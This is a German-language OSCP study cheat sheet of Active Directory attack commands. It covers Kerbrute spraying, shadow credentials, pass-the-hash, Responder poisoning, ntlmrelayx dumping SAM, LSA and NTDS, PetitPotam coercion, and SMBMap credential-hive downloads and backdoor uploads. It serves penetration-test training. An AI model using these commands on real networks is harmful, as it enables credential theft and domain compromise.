# AD Attack, NTLM & Password Attack Tools Suite

Umfassender Guide für AD-spezifische Angriffe, NTLM Relay, Responder und Password Attacks.

---

## Kerbrute

### Was ist Kerbrute?

Schnelles Tool für Kerberos Pre-Auth Enumeration - User Enumeration und Password Spraying via Kerberos.

### Installation

```bash
# Download Binary
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### User Enumeration

```bash
# User Enumeration via Kerberos
kerbrute userenum -d domain.local --dc dc.domain.local users.txt

# Mit Output File
kerbrute userenum -d domain.local --dc dc.domain.local -o valid_users.txt users.txt

# Verbose
kerbrute userenum -d domain.local --dc dc.domain.local users.txt -v

# Safe Mode (weniger Requests)
kerbrute userenum -d domain.local --dc dc.domain.local users.txt --safe
```

### Password Spray

```bash
# Single Password gegen User-Liste
kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt 'Password123!'

# Mit Delay (OPSEC)
kerbrute passwordspray -d domain.local --dc dc.domain.local --delay 1000 users.txt 'Summer2024!'

# Output File
kerbrute passwordspray -d domain.local --dc dc.domain.local -o valid_creds.txt users.txt 'Password123!'
```

### Brute Force (Vorsicht!)

```bash
# Single User, Multiple Passwords (nicht empfohlen!)
kerbrute bruteuser -d domain.local --dc dc.domain.local passwords.txt administrator

# Mit Delay
kerbrute bruteuser -d domain.local --dc dc.domain.local --delay 2000 passwords.txt admin
```

---

## Whisker

### Was ist Whisker?

Tool für Shadow Credentials Attack (AD CS PKINIT-based Authentication).

### Installation

```bash
# Download
https://github.com/eladshamir/Whisker/releases

# Oder compile from source
```

### Shadow Credentials Attack

```powershell
# Add Shadow Credential
.\Whisker.exe add /target:TARGET_USER

# Output:
# [*] Generated certificate and private key
# [*] Certificate: MIIDNzCCAh+gAwIBAgIQ...
# [*] Private Key: -----BEGIN RSA PRIVATE KEY-----...
# [*] Certificate Exported to: TARGET_USER.pfx
# [*] Run Rubeus with: Rubeus.exe asktgt /user:TARGET_USER /certificate:BASE64... /password:"" /domain:DOMAIN /dc:DC /getcredentials /show /nowrap

# List Shadow Credentials
.\Whisker.exe list /target:TARGET_USER

# Remove Shadow Credential
.\Whisker.exe remove /target:TARGET_USER /deviceid:DEVICE_ID

# Clear all Shadow Credentials
.\Whisker.exe clear /target:TARGET_USER
```

### Exploitation Workflow

```powershell
# 1. Add Shadow Credential
.\Whisker.exe add /target:victim

# 2. Use Rubeus to get TGT
.\Rubeus.exe asktgt /user:victim /certificate:BASE64_CERT /password:"" /domain:domain.local /dc:dc.domain.local /getcredentials

# 3. Ergebnis: NTLM Hash + TGT
# 4. Pass-the-Hash
```

---

## PassTheCert

### Was ist PassTheCert?

Nutzt Certificate-based Authentication für LDAP/Schannel. Alternative zu Pass-the-Hash.

### Installation

```bash
# Python Tool
git clone https://github.com/AlmondOffSec/PassTheCert
cd PassTheCert/Python
```

### Usage

```bash
# LDAP Shell mit Certificate
python3 passthecert.py -action ldap-shell -crt cert.crt -key cert.key -domain domain.local -dc-ip DC_IP

# Modify User (Add to Group)
python3 passthecert.py -action modify_user -crt cert.crt -key cert.key -domain domain.local -dc-ip DC_IP -target TARGET_USER -elevate

# Dump LAPS Passwords
python3 passthecert.py -action ldap-laps -crt cert.crt -key cert.key -domain domain.local -dc-ip DC_IP
```

---

## PTH-Toolkit

### Was ist PTH-Toolkit?

Suite von Tools für Pass-the-Hash Attacks (Linux).

### Installation

```bash
sudo apt install pth-toolkit
```

### Tools in PTH-Toolkit

```bash
# pth-winexe - Remote Command Execution
pth-winexe -U DOMAIN/user%HASH //TARGET_IP cmd

# pth-wmis - WMI Queries
pth-wmis -U DOMAIN/user%HASH //TARGET_IP "SELECT * FROM Win32_ComputerSystem"

# pth-smbclient - SMB Client
pth-smbclient -U DOMAIN/user%HASH //TARGET_IP/C$

# pth-smbget - File Download
pth-smbget -U DOMAIN/user%HASH smb://TARGET_IP/share/file.txt

# pth-rpcclient - RPC Client
pth-rpcclient -U DOMAIN/user%HASH TARGET_IP

# pth-wmic - WMI Client
pth-wmic -U DOMAIN/user%HASH //TARGET_IP "SELECT * FROM Win32_Process"

# pth-net - Net Commands
pth-net -U DOMAIN/user%HASH rpc -I TARGET_IP user list
```

### Wichtigste Commands

```bash
# Remote Shell (wie PSExec)
pth-winexe -U 'DOMAIN/administrator%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //192.168.1.100 cmd

# SMB Share Access
pth-smbclient -U 'administrator%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //192.168.1.100/C$

# Enumerate Users
pth-net -U 'admin%HASH' rpc -I 192.168.1.100 user list
```

---

## Responder

### Was ist Responder?

LLMNR/NBT-NS/MDNS Poisoner. Captured NTLM Hashes aus Network Traffic.

### Installation

```bash
# Kali (pre-installed)
sudo apt install responder

# Oder GitHub
git clone https://github.com/lgandx/Responder
```

### Basis-Usage

```bash
# Standard Run (alle Poisoners)
sudo responder -I eth0

# Verbose
sudo responder -I eth0 -v

# Analyze Mode (kein Poison, nur Listen)
sudo responder -I eth0 -A

# Force WPAD Auth
sudo responder -I eth0 -w

# Only specific Poisoners
sudo responder -I eth0 -r -d  # NBT-NS + MDNS only
```

### Configuration

```bash
# Config File
sudo nano /etc/responder/Responder.conf

# Wichtige Settings:
[Responder Core]
SQL = On           # SQL Server
SMB = On           # SMB
HTTP = On          # HTTP
HTTPS = On         # HTTPS
LDAP = On          # LDAP
DNS = On           # DNS
RDP = On           # RDP (experimental)
```

### Captured Hashes cracken

```bash
# Hashes in:
/usr/share/responder/logs/

# NTLMv2 Hash Format
john --wordlist=rockyou.txt hash.txt
hashcat -m 5600 hash.txt rockyou.txt
```

### Relay statt Capture

```bash
# Responder + ntlmrelayx
# 1. Disable SMB/HTTP in Responder.conf
sudo nano /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. Start Responder (nur Poison)
sudo responder -I eth0

# 3. Start ntlmrelayx (in anderem Terminal)
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## NTLMRelayx (Impacket)

### Was ist NTLMRelayx?

Relay NTLM Authentication zu anderen Hosts. Kombiniert mit Responder sehr mächtig.

### Installation

```bash
# Part of Impacket
sudo apt install impacket-scripts
```

### Basis-Usage

```bash
# Relay zu Single Target
impacket-ntlmrelayx -t 192.168.1.100 -smb2support

# Target List
impacket-ntlmrelayx -tf targets.txt -smb2support

# Mit Command Execution
impacket-ntlmrelayx -t 192.168.1.100 -smb2support -c "whoami"

# Dump SAM
impacket-ntlmrelayx -t 192.168.1.100 -smb2support --dump-sam

# Dump LSA Secrets
impacket-ntlmrelayx -t 192.168.1.100 -smb2support --dump-lsa

# Interactive Shell (SOCKS)
impacket-ntlmrelayx -t 192.168.1.100 -smb2support -i
# Öffnet SOCKS auf localhost:1080
```

### LDAP Relay (für AD)

```bash
# Relay zu LDAP (Domain Controller)
impacket-ntlmrelayx -t ldap://dc.domain.local --escalate-user lowpriv

# Relay + Delegate Access
impacket-ntlmrelayx -t ldap://dc.domain.local --delegate-access

# Dump NTDS
impacket-ntlmrelayx -t ldaps://dc.domain.local --dump-ntds
```

### With Responder Workflow

```bash
# Terminal 1: Responder (SMB/HTTP off)
sudo responder -I eth0

# Terminal 2: NTLMRelayx
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam

# Terminal 3: Coerce Authentication (optional)
python3 PetitPotam.py RESPONDER_IP TARGET_IP
```

---

## SMBMap

### Was ist SMBMap?

SMB Share Enumerationstool mit vielen Features.

### Installation

```bash
# Kali
sudo apt install smbmap

# Oder pip
pip3 install smbmap
```

### Basis-Enumeration

```bash
# Anonymous Access
smbmap -H 192.168.1.100

# Mit Credentials
smbmap -u user -p password -H 192.168.1.100

# Mit Hash
smbmap -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' -H 192.168.1.100

# Domain User
smbmap -u user -p password -d DOMAIN -H 192.168.1.100
```

### Share Enumeration

```bash
# List Shares
smbmap -u user -p pass -H 192.168.1.100

# List Files in Share
smbmap -u user -p pass -H 192.168.1.100 -R ShareName

# List all Files (recursive)
smbmap -u user -p pass -H 192.168.1.100 -R

# Search for specific file
smbmap -u user -p pass -H 192.168.1.100 -R -A '\.xml'
```

### File Operations

```bash
# Download File
smbmap -u user -p pass -H 192.168.1.100 --download 'C$\Windows\System32\config\SAM'

# Upload File
smbmap -u user -p pass -H 192.168.1.100 --upload '/tmp/backdoor.exe' 'C$\Temp\backdoor.exe'

# Delete File
smbmap -u user -p pass -H 192.168.1.100 --delete 'C$\Temp\backdoor.exe'
```

### Command Execution

```bash
# Execute Command
smbmap -u administrator -p pass -H 192.168.1.100 -x 'whoami'

# PowerShell Command
smbmap -u administrator -p pass -H 192.168.1.100 -X '$PSVersionTable'
```

### Pattern Matching

```bash
# Find passwords in files
smbmap -u user -p pass -H 192.168.1.100 -R -A 'pass'

# Find specific extensions
smbmap -u user -p pass -H 192.168.1.100 -R -A '\.config$'
```

---

## Password Spray

### Mit Kerbrute (Kerberos)

```bash
# Safest method (Kerberos Pre-Auth)
kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt 'Password123!'
```

### Mit CrackMapExec (SMB)

```bash
# Password Spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Gegen Domain Controller
crackmapexec smb dc.domain.local -u users.txt -p 'Password123!' --continue-on-success
```

### Mit Spray (Custom Script)

```bash
# Python-based
git clone https://github.com/Greenwolf/Spray
python3 spray.py -smb <dc_ip> <domain> users.txt passwords.txt <attempts> <lockout_minutes>
```

### OPSEC für Password Spray

```bash
# 1. Password Policy checken (VORHER!)
crackmapexec smb dc.domain.local -u user -p pass --pass-pol

# Output:
# Minimum password length: 7
# Password complexity: Enabled
# Lockout threshold: 5         # <- WICHTIG!
# Lockout duration: 30 min

# 2. Safe Spraying
# - Nur 1-2 Versuche pro Account
# - Delay zwischen Sprays
# - Häufigste Passwörter: Password1, Summer2024, Company123!
```

---

## Workflows

### Workflow 1: Responder + NTLMRelay

```bash
# 1. Responder Config (SMB/HTTP off)
sudo nano /etc/responder/Responder.conf
# SMB = Off, HTTP = Off

# 2. Terminal 1: Responder
sudo responder -I eth0 -v

# 3. Terminal 2: NTLMRelayx
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam

# 4. Wait für Authentication oder coerce via PetitPotam
python3 PetitPotam.py ATTACKER_IP TARGET_IP
```

### Workflow 2: Password Spray

```bash
# 1. User Enumeration (Kerbrute)
kerbrute userenum -d domain.local --dc dc.domain.local users.txt -o valid_users.txt

# 2. Check Password Policy
crackmapexec smb dc.domain.local -u validuser -p validpass --pass-pol

# 3. Password Spray (wenn Lockout Threshold > 3)
kerbrute passwordspray -d domain.local --dc dc.domain.local valid_users.txt 'Summer2024!'

# 4. Validate Credentials
crackmapexec smb 192.168.1.0/24 -u found_user -p found_pass
```

### Workflow 3: SMB Enumeration

```bash
# 1. Discover SMB Hosts
nmap -p445 --open 192.168.1.0/24 -oG smb_hosts.txt

# 2. SMBMap Enum
smbmap -u guest -p '' -H 192.168.1.100
smbmap -u user -p pass -H 192.168.1.100 -R

# 3. Interesting Files
smbmap -u user -p pass -H 192.168.1.100 -R -A '\.xml|\.config|pass'

# 4. Download
smbmap -u user -p pass -H 192.168.1.100 --download 'Share\interesting.xml'
```

---

## Quick Reference

### Kerbrute
```bash
kerbrute userenum -d domain.local --dc DC users.txt
kerbrute passwordspray -d domain.local --dc DC users.txt 'Pass123!'
```

### Responder
```bash
sudo responder -I eth0 -v
```

### NTLMRelayx
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam
impacket-ntlmrelayx -t ldap://dc --escalate-user user
```

### SMBMap
```bash
smbmap -u user -p pass -H IP
smbmap -u user -p pass -H IP -R
smbmap -u user -p pass -H IP --download 'C$\file.txt'
```

---

## OSCP Exam Tips

1. **Kerbrute für User Enum** - Schnell, unauffällig
2. **Password Policy IMMER checken** - Vor Password Spray
3. **Responder + NTLMRelay** - Powerful Combo
4. **SMBMap für Shares** - Schneller als smbclient
5. **PTH-Toolkit kennen** - Linux PTH Alternative
6. **Whisker/PassTheCert** - Advanced AD, nicht immer nötig
7. **OPSEC bei Password Spray** - Lockout vermeiden!
8. **NTLMRelay LDAP** - Für Domain Escalation

---

## Resources

- Kerbrute: https://github.com/ropnop/kerbrute
- Whisker: https://github.com/eladshamir/Whisker
- PassTheCert: https://github.com/AlmondOffSec/PassTheCert
- Responder: https://github.com/lgandx/Responder
- Impacket: https://github.com/fortra/impacket
- SMBMap: https://github.com/ShawnDEvans/smbmap
- HackTricks NTLM: https://book.hacktricks.xyz/windows-hardening/ntlm
